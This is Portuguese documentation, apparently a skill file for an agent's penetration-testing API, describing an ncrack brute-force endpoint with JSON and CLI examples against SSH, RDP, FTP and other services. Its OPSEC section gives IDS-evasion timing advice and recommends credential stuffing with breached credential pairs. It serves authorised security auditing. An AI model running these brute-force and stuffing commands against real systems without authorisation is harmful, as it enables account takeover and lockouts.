---
name: "ncrack"
description: "Ferramenta de brute force de autenticacao de rede de alta performance desenvolvida pela equipe do Nmap. Usa arquitetura baseada em eventos (nao bloqueante) para testar credenciais em multiplos servicos simultaneamente com controle fino de timing e concorrencia. Suporta SSH, RDP, FTP, Telnet, HTTP, HTTPS, SMB, POP3, IMAP, VNC, WordPress, Joomla, MSSQL, MySQL, PostgreSQL e Redis."
---

# ncrack

## Objetivo

O Ncrack e uma ferramenta de cracking de autenticacao de rede de alta velocidade, projetada para auxiliar pentesters e profissionais de seguranca a auditar credenciais de acesso a servicos de rede em larga escala. Diferente de outras ferramentas, utiliza arquitetura assincrona baseada em eventos (similar ao Nmap), o que permite testar milhares de conexoes simultaneamente com uso eficiente de recursos. Casos de uso principais:

- Brute force de servicos de rede com controle preciso de taxa de requisicoes (timing -T0 a -T5)
- Teste de credenciais em lista de hosts simultaneamente (-iL)
- Ataque com pares usuario:senha correspondentes (--pairwise)
- Integracao com workflows de reconhecimento (output compativel com Nmap)
- Auditoria de servicos web como WordPress e Joomla
- Cracking de bancos de dados (MySQL, MSSQL, PostgreSQL, Redis)

## Endpoint

```
POST /api/bruteforce/ncrack
```

## Requer target

Sim. O target pode ser especificado diretamente no campo `target` ou via arquivo de hosts com -iL nas options.

## Parametros

| Parametro | Tipo   | Obrigatorio | Descricao                                                                       |
|-----------|--------|-------------|---------------------------------------------------------------------------------|
| target    | string | Condicional | IP ou hostname do alvo. Pode ser omitido se -iL for usado nas options           |
| service   | string | Condicional | Servico a atacar. Pode ser embutido no target (ssh://192.168.1.1)               |
| username  | string | Condicional | Usuario unico a testar (alternativa a -U)                                       |
| passlist  | string | Condicional | Caminho absoluto da wordlist de senhas (alternativa a -P)                       |
| options   | string | Nao         | Flags adicionais do CLI passadas diretamente ao ncrack                          |

## Flags Importantes

| Flag            | Descricao                                                                                   |
|-----------------|---------------------------------------------------------------------------------------------| 
| -U userlist     | Define arquivo de usuarios (um por linha)                                                   |
| -P passlist     | Define arquivo de senhas/wordlist (uma por linha)                                           |
| --user usuario  | Define um unico usuario para o ataque                                                       |
| --pass senha    | Define uma unica senha para testar                                                          |
| -p port         | Especifica porta nao-padrao do servico                                                      |
| -T 0-5          | Timing template: 0=paranoid, 1=sneaky, 2=polite, 3=normal, 4=aggressive, 5=insane          |
| -v              | Verbose: exibe progresso e tentativas                                                       |
| -vv             | Extra verbose: exibe mais detalhes de conexao e autenticacao                                |
| --pairwise      | Testa pares usuario:senha correspondentes (linha 1 com linha 1, etc.) em vez de produto cartesiano |
| -oN file        | Salva saida em formato normal (legivel) em arquivo                                          |
| -oX file        | Salva saida em formato XML (compativel com Nmap)                                            |
| -iL file        | Le lista de alvos de arquivo (um host por linha, opcionalmente com servico: ssh://10.0.0.1)|
| --resume file   | Retoma sessao salva anteriormente                                                           |
| --connection-limit N | Limite de conexoes simultaneas totais                                                 |
| --timeout ms    | Timeout de conexao em milissegundos                                                         |

### Timing Templates (-T)

| Nivel | Nome       | Descricao                                                              |
|-------|------------|------------------------------------------------------------------------|
| -T0   | paranoid   | Extremamente lento, uma tentativa de cada vez, maximo stealth         |
| -T1   | sneaky     | Muito lento, adequado para alvos com IDS sensivel                     |
| -T2   | polite     | Lento, menos sobrecarga no alvo                                       |
| -T3   | normal     | Velocidade padrao equilibrada (default)                               |
| -T4   | aggressive | Rapido, assume boa conexao e alvo nao muito protegido                 |
| -T5   | insane     | Maximo de velocidade, pode sobrecarregar o alvo ou gerar bloqueios   |

### Servicos Suportados

| Categoria     | Servicos                                                   |
|---------------|------------------------------------------------------------|
| Remote Access | ssh, rdp, telnet, vnc                                      |
| File Transfer | ftp                                                        |
| Web           | http, https, wordpress, joomla                             |
| Mail          | pop3, imap                                                 |
| Database      | mssql, mysql, psql (PostgreSQL), redis                     |
| Network       | smb                                                        |

### Sintaxe de Target com Servico Embutido

O ncrack aceita targets com o servico e porta embutidos na URI:
```
ssh://192.168.1.1          # SSH na porta padrao 22
rdp://10.0.0.5:3390        # RDP em porta customizada
ftp://192.168.1.100        # FTP na porta 21
mysql://10.10.10.5:3306    # MySQL
wordpress://192.168.1.10   # WordPress admin login
```

## Exemplos

### Caso 1 - Brute force SSH com usuario fixo e wordlist

```json
{
  "target": "192.168.1.10",
  "service": "ssh",
  "username": "root",
  "passlist": "/usr/share/wordlists/rockyou.txt",
  "options": "-T3 -v"
}
```

Comando CLI equivalente:
```
ncrack --user root -P /usr/share/wordlists/rockyou.txt -T3 -v ssh://192.168.1.10
```

### Caso 2 - Brute force RDP com lista de usuarios e lista de senhas

```json
{
  "target": "10.0.0.5",
  "service": "rdp",
  "options": "-U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -T3 -oN /tmp/rdp_results.txt"
}
```

Comando CLI equivalente:
```
ncrack -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -T3 -oN /tmp/rdp_results.txt rdp://10.0.0.5
```

### Caso 3 - Ataque silencioso SSH com timing paranoid (IDS evasion)

```json
{
  "target": "10.10.10.50",
  "service": "ssh",
  "options": "-U /tmp/users.txt -P /tmp/pass.txt -T1 -v -oN /tmp/ssh_slow.txt"
}
```

Comando CLI equivalente:
```
ncrack -U /tmp/users.txt -P /tmp/pass.txt -T1 -v -oN /tmp/ssh_slow.txt ssh://10.10.10.50
```

Use -T1 (sneaky) para evitar deteccao por IDS e prevenir lockout de conta por taxa de tentativas.

### Caso 4 - Ataque com pares usuario:senha correspondentes (credential stuffing)

```json
{
  "target": "10.0.0.20",
  "service": "ftp",
  "options": "-U /tmp/leaked_users.txt -P /tmp/leaked_passes.txt --pairwise -T3 -oN /tmp/ftp_stuffing.txt"
}
```

Comando CLI equivalente:
```
ncrack -U /tmp/leaked_users.txt -P /tmp/leaked_passes.txt --pairwise -T3 -oN /tmp/ftp_stuffing.txt ftp://10.0.0.20
```

Com --pairwise, o ncrack testa: linha1_user:linha1_pass, linha2_user:linha2_pass, etc.
Ideal para credential stuffing com dados de vazamentos onde usuario e senha sao pares conhecidos.

### Caso 5 - Ataque a multiplos hosts a partir de arquivo de alvos

```json
{
  "target": "N/A",
  "options": "-U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -T3 -iL /tmp/hosts_ssh.txt -oX /tmp/ncrack_results.xml"
}
```

Comando CLI equivalente:
```
ncrack -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -T3 -iL /tmp/hosts_ssh.txt -oX /tmp/ncrack_results.xml
```

O arquivo hosts_ssh.txt pode conter hosts com servico embutido, um por linha:
```
ssh://192.168.1.10
ssh://192.168.1.11
rdp://10.0.0.5:3390
ftp://10.0.0.20
```

## OPSEC

- **Timing e deteccao**: Use -T1 ou -T2 em ambientes com monitoramento ativo. O timing -T5 gera conexoes em massa e sera detectado por qualquer SIEM ou IDS em segundos.
- **Lockout de conta**: O ncrack nao tem protecao nativa contra lockout de conta AD. Com -T3 ou superior, pode travar contas antes de encontrar a senha. Verifique a politica de lockout do alvo antes do ataque.
- **RDP e NLA**: Alvos Windows com Network Level Authentication (NLA) habilitado requerem autenticacao antes de estabelecer a sessao RDP completa. O ncrack suporta NLA, mas e mais lento nesse modo.
- **SSH rate limiting**: Use --connection-limit 1 combinado com -T2 para evitar multiplas conexoes SSH simultaneas que podem disparar Fail2ban.
- **Salve resultados sempre**: Use -oN ou -oX para salvar saida. O ncrack nao salva automaticamente, e qualquer interrupcao perde os resultados obtidos ate entao.
- **WordPress/Joomla**: O ataque a CMSs via ncrack usa a pagina de login padrao. Se o site usa plugin de seguranca (Wordfence, Jetpack) com CAPTCHA ou lockout, o ataque sera bloqueado.
- **Bancos de dados**: Para MySQL e PostgreSQL expostos externamente, teste primeiro com --pass vazio (conta sem senha) antes de lancar wordlist completa.
- **--pairwise para credential stuffing**: Ideal para usar com dados de brechas (Have I Been Pwned, etc.) onde os pares user:pass originais sao conhecidos. Muito mais eficiente que produto cartesiano.

## Saida

A API retorna um objeto JSON com os seguintes campos:

| Campo     | Tipo    | Descricao                                                              |
|-----------|---------|------------------------------------------------------------------------|
| success   | boolean | true se a execucao ocorreu sem erros fatais                            |
| stdout    | string  | Saida padrao do ncrack com credenciais encontradas (se houver)         |
| stderr    | string  | Erros e avisos emitidos pela ferramenta durante a execucao             |
| report    | string  | Resumo estruturado gerado pela API com credenciais extraidas           |
| artifacts | array   | Lista de arquivos gerados (ex: arquivo -oN ou -oX)                     |

Exemplo de stdout com credencial encontrada:
```
Discovered credentials for ssh on 192.168.1.10 22/tcp:
192.168.1.10 22/tcp ssh: root toor
```

Exemplo de stdout sem credenciais:
```
Ncrack done: 1 service scanned in 120.00 seconds.
Ncrack finished.
```
